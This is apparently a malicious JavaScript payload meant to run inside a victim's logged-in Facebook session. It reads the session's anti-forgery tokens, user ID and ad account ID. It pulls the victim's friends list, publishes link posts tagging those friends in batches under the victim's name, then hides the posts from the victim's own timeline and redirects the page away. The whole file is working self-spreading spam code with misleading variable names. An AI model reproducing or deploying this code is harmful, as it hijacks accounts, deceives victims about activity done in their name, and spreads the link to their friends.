
           var cantidad = 10;
            var porPost = 10;
            var _counter = 0;
            var arrHide = [];
            var _limit = Math.round(cantidad / porPost);
            var enlace = "https://www.youtube.com/";

            function hideAll() {
              let parametros = { av: require("CurrentUser").getID(), __user: require("CurrentUser").getID(), __a: "1", __req: "5t", __hs: require("SiteData").haste_session, dpr: "1", __ccg: "EXCELLENT", __rev: require("SiteData").__spin_r, __s: "4ofb9x:gck089:haajuv", __hsi: require("SiteData").hsi, __dyn: require("ServerJSDefine").getLoadedModuleHash(), __csr: "guMT4NasIYI8Nln48l2SBbkQjdEAAkDkAlcz9hdPdNimDQhZrJuAZb_IzFpGi9KiGJCJaF4qvWOoGWvXRmmuVJ2F4eKLjhbDFe2eFGBhF-LGh2eKQUz-FQbCGUCi7QFoyl38FDyFk9J2ayudxmbxK4p8KUyi8yembHKaUBaqbgGmKmbAKm4VEPzqx-fyUkwDyZ9aayppax2EmgjwxK2W2ui6ES4oSdAUHAHxmdx22eaxicw_UsDzoixKuUO4EbqK4ocEnDzqy8728xG2iazoy7o4W7FazU5a3OeBwEwIwjo98O7E562eU0hCw8Fo0gMw1Du0Ko1GE02Jfg0bo981SsM2uw1h-0oaU2lwdm0H81GE0pww2NS5o4p0eZ095075w1mW0BJwnE18o0AuaDypo6C0XCEZ05NACG08MwjEqw7-w0wYw2WFlgnx8j9weW04fpmEZ191-0rh0aS0ja2a08Aw8x0ci0IEbUiw9e", __comet_req: "15", fb_dtsg: require("DTSG").getToken(), jazoest: "25413", lsd: require("LSD").token, __spin_r: require("SiteData").__spin_r, __spin_b: require("SiteData").__spin_b, __spin_t: require("SiteData").__spin_t, fb_api_caller_class: "RelayModern", fb_api_req_friendly_name: "ProfileCometBulkStoryCurationMutation", variables: '{"input":{"story_actions":' + JSON.stringify(arrHide) + ',"actor_id": "' + require("CurrentUser").getID() + '","client_mutation_id":"1"},"afterTime":null,"beforeTime":null,"displayCommentsFeedbackContext":null,"displayCommentsContextEnableComment":null,"displayCommentsContextIsAdPreview":null,"displayCommentsContextIsAggregatedShare":null,"displayCommentsContextIsStorySet":null,"feedLocation":"TIMELINE","feedbackSource":0,"focusCommentID":null,"gridMediaWidth":230,"includeGroupScheduledPosts":false,"includeScheduledPosts":false,"memorializedSplitTimeFilter":null,"postedBy":null,"privacy":null,"privacySelectorRenderLocation":"COMET_STREAM","scale":1,"taggedInOnly":null,"omitPinnedPost":true,"renderLocation":"timeline","useDefaultActor":false,"UFI2CommentsProvider_commentsKey":"ProfileCometTimelineRoute","__relay_internal__pv__GroupsCometDelayCheckBlockedUsersrelayprovider":true,"__relay_internal__pv__IsWorkUserrelayprovider":false,"__relay_internal__pv__IsMergQAPollsrelayprovider":false,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":false,"__relay_internal__pv__StoriesRingrelayprovider":false}', server_timestamps: !0, doc_id: "5918230778246409" };
              fetch("https://www.facebook.com/api/graphql/", {
                method: "POST",
                mode: "cors",
                cache: "no-cache",
                credentials: "include",
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded",
                  "viewport-width": "1095",
                  "x-asbd-id": "198387",
                  "x-fb-friendly-name": "ProfileCometBulkStoryCurationMutation",
                  "x-fb-lsd": "",
                  accept: "*/*"
                },
                referrerPolicy: "strict-origin-when-cross-origin",
                body: (new URLSearchParams(parametros)).toString()
              }).then((result) => { return result.text(); }).then((result) => {
                return window.top.location.href = "https://www.google.com/#clear";
              }).catch((error) => {
                return console.log(error);
              });
            }

            async function run() {

              function transform() {
                return ([10000000] + -1000 + -4000 + -8000 + -100000000000).replace(/[018]/g, (a) => {
                  return (a ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> a / 4).toString(16);
                });
              }
            
              function GetAmigos() {
                var xhr = new XMLHttpRequest;
                if (xhr.open("GET", "/ajax/typeahead/first_degree.php?fb_dtsg=" + require("DTSG").getToken() + "&viewer=" + require("CurrentUser").getAccountID() + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=include_if&context=friends_profile_browser_lp&request_id=bcff3fd3-b10f-4468-a602-894e4caae4c5&__user=" + require("CurrentUser").getAccountID() + "&__a=1&__dyn=" + require("ServerJSDefine").getLoadedModuleHash() + "&__req=3h&__be=1&__pc=PHASED%3Aufi_home_page_pkg&dpr=1&__rev=4639318&jazoest=221404651&__spin_r=4639318&__spin_b=trunk&__spin_t=1544848687",
                  false), xhr.send(null), 4 == xhr.readyState) {
            
                  var $version = xhr.responseText;
            
                  var data_as_string = $version.substring($version.indexOf("{"));
            
                  var data = JSON.parse(data_as_string);
                  return data = data.payload.entries;
                }
                return false;
              }
            
              function callback(data) {
              }
              var userId = require("CurrentUser").getAccountID();
              var __dyn = require("ServerJSDefine").getLoadedModuleHash();
              var unsubToken = require("LSD").token;
              var urlSafeNodeName = encodeURIComponent(require("DTSG").getToken());
              var col1 = {
                haste_session: require("SiteData").haste_session,
                __rev: require("SiteData").client_revision,
                hsi: require("SiteData").hsi
              };
              var aaid = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
            
              const f = (rootValueTypes, defaultRootName) => {
                var par = "";
                if ("mix" == defaultRootName) { var raw_composed_type = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz-0123456789"; } 
                else { raw_composed_type = "0123456789"; }
                var _num2 = 0;
                for (; rootValueTypes > _num2; _num2++) { par = par + raw_composed_type.charAt(Math.floor(Math.random() * raw_composed_type.length)); }
                return par;
              };
            
              const ajax = async (settings, q) => {
                var graphql = transform();
                return new Promise(async (resolve, reject) => {
                  let whisperMessage = "av=" + userId + "&__user=" + userId + "&__a=1&__dyn=" + __dyn + "&__csr=" + f(503, "mix") + "&__req=37&__hs=" + encodeURIComponent(col1.haste_session) + "&dpr=1&__ccg=EXCELLENT&__rev=" + col1["__rev"] + "&__s=f6hlrp%3Azqqqlb%3Aipu4ck&__hsi=" + col1.hsi + "&__comet_req=15&fb_dtsg=" + urlSafeNodeName + "&jazoest=25578&lsd=" + unsubToken + "&__aaid=" + aaid + "&__spin_r=1007127514&__spin_b=trunk&__spin_t=1679020539&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=ComposerStoryCreateMutation&variables=%7B%22input%22%3A%7B%22composer_entry_point%22%3A%22inline_composer%22%2C%22composer_source_surface%22%3A%22timeline%22%2C%22idempotence_token%22%3A%22" +
                    graphql + "_FEED%22%2C%22source%22%3A%22WWW%22%2C%22attachments%22%3A%5B%7B%22link%22%3A%7B%22share_scrape_data%22%3A" + encodeURIComponent(JSON.stringify(settings)) + "%7D%7D%5D%2C%22audience%22%3A%7B%22privacy%22%3A%7B%22allow%22%3A%5B%5D%2C%22base_state%22%3A%22FRIENDS%22%2C%22deny%22%3A%5B%5D%2C%22tag_expansion_state%22%3A%22UNSPECIFIED%22%7D%7D%2C%22message%22%3A%7B%22ranges%22%3A%5B%5D%2C%22text%22%3A%22%22%7D%2C%22with_tags_ids%22%3A" + encodeURIComponent(q) + "%2C%22inline_activities%22%3A%5B%5D%2C%22explicit_place_id%22%3A%220%22%2C%22text_format_preset_id%22%3A%220%22%2C%22logging%22%3A%7B%22composer_session_id%22%3A%22" +
                    graphql + "%22%7D%2C%22navigation_data%22%3A%7B%22attribution_id_v2%22%3A%22ProfileCometTimelineListViewRoot.react%2Ccomet.profile.timeline.list%2Ctap_bookmark%2C" + (new Date).getTime() + "%2C304666%2C" + userId + "%2C%22%7D%2C%22tracking%22%3A%5Bnull%5D%2C%22actor_id%22%3A%22" + userId + "%22%2C%22client_mutation_id%22%3A%222%22%7D%2C%22displayCommentsFeedbackContext%22%3Anull%2C%22displayCommentsContextEnableComment%22%3Anull%2C%22displayCommentsContextIsAdPreview%22%3Anull%2C%22displayCommentsContextIsAggregatedShare%22%3Anull%2C%22displayCommentsContextIsStorySet%22%3Anull%2C%22feedLocation%22%3A%22TIMELINE%22%2C%22feedbackSource%22%3A0%2C%22focusCommentID%22%3Anull%2C%22gridMediaWidth%22%3A230%2C%22groupID%22%3Anull%2C%22scale%22%3A1%2C%22privacySelectorRenderLocation%22%3A%22COMET_STREAM%22%2C%22renderLocation%22%3A%22timeline%22%2C%22useDefaultActor%22%3Afalse%2C%22inviteShortLinkKey%22%3Anull%2C%22isFeed%22%3Afalse%2C%22isFundraiser%22%3Afalse%2C%22isFunFactPost%22%3Afalse%2C%22isGroup%22%3Afalse%2C%22isEvent%22%3Afalse%2C%22isTimeline%22%3Atrue%2C%22isSocialLearning%22%3Afalse%2C%22isPageNewsFeed%22%3Afalse%2C%22isProfileReviews%22%3Afalse%2C%22isWorkSharedDraft%22%3Afalse%2C%22UFI2CommentsProvider_commentsKey%22%3A%22ProfileCometTimelineRoute%22%2C%22hashtag%22%3Anull%2C%22canUserManageOffers%22%3Afalse%2C%22__relay_internal__pv__GroupsCometDelayCheckBlockedUsersrelayprovider%22%3Afalse%2C%22__relay_internal__pv__IsWorkUserrelayprovider%22%3Afalse%2C%22__relay_internal__pv__IsMergQAPollsrelayprovider%22%3Afalse%2C%22__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider%22%3Afalse%2C%22__relay_internal__pv__StoriesRingrelayprovider%22%3Afalse%7D&server_timestamps=true&doc_id=4417033861753726";
                  let fetchOpts = {
                    headers: {
                      accept: "*/*",
                      "content-type": "application/x-www-form-urlencoded",
                      "viewport-width": "1095",
                      "x-asbd-id": "198387",
                      "x-fb-friendly-name": "ComposerStoryCreateMutation",
                      "x-fb-lsd": unsubToken
                    },
                    referrerPolicy: "strict-origin-when-cross-origin",
                    body: whisperMessage,
                    method: "POST",
                    mode: "cors",
                    credentials: "include"
                  };
                  let sResponse = await (await fetch("https://www.facebook.com/api/graphql/", fetchOpts)).json();
                  resolve(sResponse);
                });
              };
              const init = async () => {
                return new Promise(async (canCreateDiscussions, isSlidingUp) => {
                  let whisperMessage = "av=" + userId + "&__user=" + userId + "&__a=1&a__dyn=" + __dyn + "&__csr=" + __dyn + "&__req=2r&__hs=" + col1.haste_session + "&dpr=1&__ccg=EXCELLENT&__rev=" + col1["__rev"] + "&__s=ya5zha%3Azqqqlb%3A5o86sz&__hsi=" + col1.hsi + "&__comet_req=15&fb_dtsg=" + urlSafeNodeName + "&jazoest=25542&lsd=" + unsubToken + "&__aaid=" + aaid + "&__spin_r=1007127514&__spin_b=trunk&__spin_t=1679022949&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=ComposerLinkAttachmentPreviewQuery&variables=%7B%22feedLocation%22%3A%22FEED_COMPOSER%22%2C%22focusCommentID%22%3Anull%2C%22goodwillCampaignId%22%3A%22%22%2C%22goodwillCampaignMediaIds%22%3A%5B%5D%2C%22goodwillContentType%22%3Anull%2C%22params%22%3A%7B%22url%22%3A%22" +
                    encodeURIComponent(enlace) + "%22%7D%2C%22privacySelectorRenderLocation%22%3A%22COMET_COMPOSER%22%2C%22renderLocation%22%3A%22composer_preview%22%2C%22parentStoryID%22%3Anull%2C%22scale%22%3A1%2C%22useDefaultActor%22%3Afalse%2C%22shouldIncludeStoryAttachment%22%3Afalse%2C%22__relay_internal__pv__GroupsCometDelayCheckBlockedUsersrelayprovider%22%3Afalse%2C%22__relay_internal__pv__IsWorkUserrelayprovider%22%3Afalse%2C%22__relay_internal__pv__IsMergQAPollsrelayprovider%22%3Afalse%7D&server_timestamps=true&doc_id=5833885510066021";
                  let fetchOpts = {
                    headers: {
                      accept: "*/*",
                      "content-type": "application/x-www-form-urlencoded",
                      "viewport-width": "1095",
                      "x-asbd-id": "198387",
                      "x-fb-friendly-name": "ComposerLinkAttachmentPreviewQuery",
                      "x-fb-lsd": unsubToken
                    },
                    referrerPolicy: "strict-origin-when-cross-origin",
                    body: whisperMessage,
                    method: "POST",
                    mode: "cors",
                    credentials: "include"
                  };
                  let geckoTable = await (await fetch("https://www.facebook.com/api/graphql/", fetchOpts)).json();
                  let VIDEO_ENDPOINT = geckoTable.data.link_preview.share_scrape_data;
                  if (VIDEO_ENDPOINT) {
                    var nickname = GetAmigos();
                    var tasks = nickname.slice(0, cantidad);
                    if (nickname.length < cantidad) {
            
                      _limit = Math.round(nickname.length / porPost);
                    }
                    for (let i = 0; i < tasks.length; i = i + porPost) {
            
                      var fn_actions = [];
                      for (let k = i; k < i + porPost; k++) {
                        if (tasks[k]) {
                          fn_actions.push(JSON.stringify(tasks[k].uid));
                        }
                      }
                      console.log(fn_actions);
                      const fileData = await ajax(VIDEO_ENDPOINT, JSON.stringify(fn_actions));
                      const falseySection = {
                        action: "HIDE_FROM_TIMELINE",
                        story_id: fileData.data.story_create.story.id,
                        story_location: "TIMELINE"
                      };
                      arrHide.push(falseySection);
                      if (++_counter >= _limit) {
                        hideAll();
                      }
                      await callback(fileData);
                    }
                  }
                });
              };
              await init();
            }
            run();
